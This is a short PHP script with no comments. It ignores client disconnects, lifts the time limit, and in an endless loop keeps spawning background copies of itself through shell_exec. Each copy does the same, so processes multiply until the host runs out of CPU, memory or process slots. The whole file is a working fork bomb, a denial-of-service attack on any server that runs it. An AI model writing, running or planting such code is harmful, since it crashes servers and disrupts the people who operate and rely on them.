<?php
ignore_user_abort(true);
set_time_limit(0);

$filename = escapeshellarg(__FILE__);

usleep(rand(100000, 1000000));

while (true) {
    shell_exec("php $filename > /dev/null 2>&1 &");
    usleep(rand(100000, 1000000));
}
?>
